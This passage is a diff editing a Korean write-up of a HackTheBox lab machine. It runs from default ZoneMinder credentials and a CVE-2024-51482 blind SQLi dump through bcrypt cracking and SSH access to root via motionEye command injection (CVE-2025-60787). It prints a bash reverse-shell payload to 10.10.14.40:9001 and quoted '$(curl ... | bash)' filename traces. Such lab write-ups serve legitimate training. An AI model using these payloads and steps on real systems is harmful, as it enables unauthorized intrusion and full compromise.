@@ -37,7 +37,7 @@ echo "10.129.244.156 cctv.htb" | sudo tee -a /etc/hosts
 
 ### 웹 애플리케이션 식별
 
-브라우저로 `http://cctv.htb/`에 접속하면 SecureVision이라는 CCTV 보안 서비스 소개 페이지가 표시된다.
+브라우저로 `http://cctv.htb/`에 접속하면 SecureVision이라는 CCTV 보안 서비스 소개 페이지가 표시된다. 우측 상단의 Staff Login 버튼을 클릭하면 `/zm` 경로로 이동하며 ZoneMinder 로그인 페이지가 나타난다.
 
 ![web main page](images/web_main_page.png)
 
@@ -45,15 +45,13 @@ Wappalyzer로 분석하면 Apache HTTP Server 2.4.58, Ubuntu가 확인된다.
 
 ![wappalyzer](images/wappalyzer.png)
 
-우측 상단의 Staff Login 버튼을 클릭하면 `/zm` 경로로 이동하며 ZoneMinder 로그인 페이지가 표시된다.
-
 ### ZoneMinder 로그인 및 버전 확인
 
 기본 크리덴셜 `admin/admin`으로 로그인에 성공한다.
 
 ![zoneminder login](images/zoneminder_login.png)
 
-Options 메뉴에서 ZoneMinder 버전을 확인한다.
+Options 메뉴에서 현재 ZoneMinder 버전을 확인한다.
 
 ```
 DYN_CURR_VERSION: 1.37.63
@@ -94,9 +92,11 @@ python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --test
 python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --users --sleep 5
 ```
 
+`--test` 옵션으로 먼저 취약 여부를 확인한다. 응답 시간이 2초 이상 지연되면 취약한 것이다.
+
 ![cve-2024-51482 exploit vulnerable](images/cve_2024_51482_exploit_vulnerable.png)
 
-Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간이 소요된다. `--sleep 5` 옵션으로 HTB 네트워크 지연에 대응한다.
+Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간이 소요된다. `--sleep 5` 옵션으로 HTB 네트워크 지연에 대응한다. 덤프가 완료되면 아래와 같이 크리덴셜이 추출된다.
 
 ![cve-2024-51482 credentials dumped](images/cve_2024_51482_credentials_dumped.png)
 
@@ -110,7 +110,7 @@ Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간�
 
 ### bcrypt 해시 크래킹
 
-해시를 파일로 저장하고 hashcat으로 크래킹한다. `$2y$`는 bcrypt 알고리즘이므로 `-m 3200`을 사용한다.
+해시를 파일로 저장하고 hashcat으로 크래킹한다. `$2y$`는 bcrypt 알고리즘이므로 `-m 3200`을 사용한다. VM 환경에서는 bcrypt GPU 가속이 불가능하므로 macOS에서 OpenCL GPU 가속을 활용한다.
 
 ```bash
 cat > hashes.txt << 'EOF'
@@ -123,6 +123,7 @@ head -n 100000 rockyou.txt > small.txt
 hashcat -m 3200 hashes.txt small.txt
 ```
 
+rockyou.txt 전체를 돌리면 bcrypt 특성상 수일이 소요되므로 상위 10만 개만 잘라서 시도한다. 자주 사용되는 패스워드일수록 앞쪽에 위치하기 때문에 효과적이다.
 
 ![hashcat bcrypt setup](images/hashcat_bcrypt_setup.png)
 
@@ -149,7 +150,24 @@ ssh mark@cctv.htb
 
 ### 내부 서비스 열거
 
-SSH 접속 후 내부 리스닝 포트를 확인한다.
+SSH 접속 후 `/opt` 디렉토리를 확인하면 `video` 폴더가 존재한다.
+
+```bash
+ls -la /opt
+```
+
+![opt directory](images/opt_directory.png)
+
+`/opt/video/backups/server.log`를 확인하면 `sa_mark` 계정이 `status`, `disk-info` 명령을 주기적으로 실행하는 기록이 남아있다. 내부 어딘가에서 동작 중인 서비스가 있다는 것을 알 수 있다.
+
+```bash
+ls -laR /opt/video
+cat /opt/video/backups/server.log
+```
+
+![server log found](images/server_log_found.png)
+
+내부 리스닝 포트를 확인한다.
 
 ```bash
 ss -tlnp
@@ -171,18 +189,7 @@ curl -s http://127.0.0.1:8765   # motionEye HTML 응답
 
 ![motion motioneye identified](images/motion_motioneye_identified.png)
 
-### /opt/video 탐색 및 Command Injection 흔적 발견
-
-```bash
-ls -la /opt/video/backups/
-cat /opt/video/backups/server.log
-```
-
-![server log found](images/server_log_found.png)
-
-`/opt/video` 디렉토리에서 server.log를 발견한다. 로그에는 `sa_mark` 계정이 `status`, `disk-info` 명령을 주기적으로 실행하는 기록이 남아있다.
-
-![opt directory](images/opt_directory.png)
+### Command Injection 흔적 발견
 
 `/var/lib/motioneye/Camera1/` 디렉토리에는 머신 제작자가 남긴 Command Injection 흔적이 파일명에 그대로 남아있다.
 
@@ -191,7 +198,9 @@ $(curl 192.168.139.133 | bash).2025-11-08-01-11-50.jpg
 lastsnap.jpg -> $(python3 -c "import os;os.system(...)").2025-11-08-01-16-20.jpg
 ```
 
-이 흔적이 이 머신의 공격 경로를 암시한다. motionEye의 파일명 설정에 쉘 메타문자가 삽입되면 motion 프로세스가 설정을 재로드할 때 명령어가 실행된다.
+![camera1 injection payloads](images/camera1_injection_payloads.png)
+
+motionEye의 파일명 설정에 쉘 메타문자가 삽입되면 motion 프로세스가 설정을 재로드할 때 명령어가 실행된다. 이것이 이 머신의 공격 경로임을 알 수 있다.
 
 ---
 
@@ -199,7 +208,7 @@ lastsnap.jpg -> $(python3 -c "import os;os.system(...)").2025-11-08-01-16-20.jpg
 
 ### CVE-2025-60787 — motionEye RCE
 
-motionEye 0.43.1b4 이하 버전에서 웹 UI의 `image_file_name` 설정 필드에 대한 검증이 클라이언트(JavaScript)에서만 이루어진다. 브라우저 콘솔에서 검증 함수를 덮어쓰면 `$()` 형식의 쉘 메타문자가 포함된 값을 서버에 저장할 수 있다. motion 프로세스가 해당 설정을 파일명으로 처리할 때 쉘이 `$()` 안의 명령어를 실행한다.
+motionEye 0.43.1b4 이하 버전에서 웹 UI의 `image_file_name` 설정 필드에 대한 검증이 클라이언트(JavaScript)에서만 이루어진다. 브라우저 콘솔에서 검증 함수를 덮어쓰면 `$()` 형식의 쉘 메타문자가 포함된 값을 서버에 저장할 수 있다.
 
 ```bash
 searchsploit motioneye
@@ -211,7 +220,7 @@ searchsploit motioneye
 
 ### motionEye 관리자 접속
 
-motionEye는 기본적으로 로컬호스트에만 바인딩되어 있으므로 SSH 포트 포워딩으로 접근한다.
+motionEye는 로컬호스트에만 바인딩되어 있으므로 SSH 포트 포워딩으로 접근한다.
 
 ```bash
 ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
@@ -219,7 +228,7 @@ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 
 ![ssh port forward](images/ssh_port_forward.png)
 
-`/etc/motioneye/motion.conf`에서 motionEye 관리자 패스워드 해시를 확인한다.
+`/etc/motioneye/motion.conf`에서 motionEye 관리자 크리덴셜을 확인한다.
 
 ```bash
 grep -r "password\|username\|admin" /etc/motioneye/ 2>/dev/null
@@ -232,15 +241,13 @@ grep -r "password\|username\|admin" /etc/motioneye/ 2>/dev/null
 # @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
 ```
 
-저장된 값(`989c5a8...`)을 패스워드로 입력하면 로그인에 성공한다.
+motionEye는 저장된 해시값 자체를 패스워드 입력란에 넣어도 인증된다. `989c5a8...` 값을 패스워드로 입력하면 로그인에 성공한다.
 
-### motionEye API 서명 계산 및 인증
+### motionEye API 서명 계산
 
-motionEye API는 매 요청마다 `_username`과 `_signature`를 요구한다. 서명은 `SHA1(method:path:body:key)` 형식으로 계산되며, `key`에는 저장된 패스워드 값을 그대로 사용할 수 있다.
+motionEye API는 매 요청마다 `_username`과 `_signature`를 요구한다. 서명은 `SHA1(method:path:body:key)` 형식으로 계산된다. 타겟 머신의 motioneye 라이브러리를 직접 import하여 정확한 서명을 계산한다.
 
-타겟 머신의 motioneye 라이브러리를 직접 import하여 정확한 서명을 계산한다.
-
-```python
+```bash
 python3 << 'EOF'
 import sys
 sys.path.insert(0, '/usr/local/lib/python3.12/dist-packages')
@@ -261,7 +268,7 @@ EOF
 
 ![motioneye signature calculated](images/motioneye_signature_calculated.png)
 
-계산된 서명으로 API 인증 성공을 확인한다.
+계산된 서명으로 API를 호출하면 카메라 설정 전체가 반환되며 인증 성공을 확인한다.
 
 ```bash
 curl -s "http://127.0.0.1:8765/config/list?_username=admin&_signature=<sig>" | python3 -m json.tool
@@ -269,7 +276,13 @@ curl -s "http://127.0.0.1:8765/config/list?_username=admin&_signature=<sig>" | p
 
 ![motioneye config list success](images/motioneye_config_list_success.png)
 
-### 페이로드 삽입
+### 페이로드 삽입 및 리버스 쉘 획득
+
+칼리에서 리스너를 먼저 준비한다.
+
+```bash
+nc -lvnp 9001
+```
 
 브라우저에서 `http://127.0.0.1:8765` 접속 후 F12 콘솔에서 JS 검증 함수를 우회한다.
 
@@ -287,22 +300,14 @@ $(bash -c 'bash -i >& /dev/tcp/10.10.14.40/9001 0>&1').%Y-%m-%d-%H-%M-%S
 
 ![motioneye ui payload](images/motioneye_ui_payload.png)
 
-### 리버스 쉘 획득
-
-칼리에서 리스너를 준비한다.
-
-```bash
-nc -lvnp 9001
-```
-
-설정 변경 후 framerate 등 임의 설정을 수정하고 Apply하면 motion이 재시작되면서 설정 파일을 재로드한다. 이때 `picture_filename` 값이 쉘에 의해 처리되면서 페이로드가 실행된다.
+Apply 후 framerate 등 임의 설정값을 변경하고 다시 Apply하면 motion이 재시작되면서 설정 파일을 재로드한다. 이때 `picture_filename` 값이 쉘에 의해 처리되면서 `$()` 안의 명령어가 실행된다.
 
 ![reverse shell root](images/reverse_shell_root.png)
 
 root 권한으로 리버스 쉘이 연결된다.
 
 ```bash
-find / -name "user.txt" 2>/dev/null   # /home/sa_mark/user.txt
+find / -name "user.txt" 2>/dev/null
 cat /home/sa_mark/user.txt
 cat /root/root.txt
 ```
@@ -339,11 +344,10 @@ motionEye의 Client-side Validation Bypass는 웹 보안의 기본 원칙인 "�
 | ZoneMinder 로그인 | 기본 크리덴셜 `admin/admin` | 브라우저 |
 | Blind SQL Injection | Time-based SQLi로 Users 테이블 덤프 | CVE-2024-51482 PoC |
 | 해시 크래킹 | bcrypt 오프라인 크래킹 | hashcat |
-| SSH 접속 | mark/opensesame | ssh |
-| 내부 서비스 열거 | 로컬 포트 확인, motionEye 발견 | ss, curl |
+| SSH 접속 | mark / opensesame | ssh |
+| 내부 서비스 열거 | /opt 탐색, 로컬 포트 확인, motionEye 발견 | ls, ss, curl |
 | motionEye 접근 | SSH 포트 포워딩 | ssh -L |
 | API 인증 | 소스코드 분석으로 서명 직접 계산 | Python |
 | JS 검증 우회 | 브라우저 콘솔에서 검증 함수 덮어쓰기 | 브라우저 DevTools |
 | Command Injection | `image_file_name`에 리버스 쉘 페이로드 삽입 | 브라우저 |
 | 리버스 쉘 (root) | motion 설정 재로드 시 페이로드 실행 | nc |
-
